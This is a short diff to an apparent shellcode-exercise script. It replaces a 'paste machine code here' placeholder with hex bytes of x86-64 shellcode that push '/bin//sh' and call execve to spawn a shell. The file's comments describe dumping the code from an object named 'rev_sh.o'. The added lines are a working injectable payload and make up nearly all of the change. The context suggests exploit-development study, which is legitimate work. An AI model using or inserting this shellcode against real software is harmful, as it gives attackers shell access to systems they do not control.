@@ -3,7 +3,8 @@
 # Run "xxd -p -c 20 rev_sh.o",
 # copy and paste the machine code to the following:
 ori_sh ="""
-copy and paste machie code here
+4831d25248b82f62696e2f2f7368504889e75257
+4889e64831c0b03b0f05
 """
 
 sh = ori_sh.replace("\n", "")
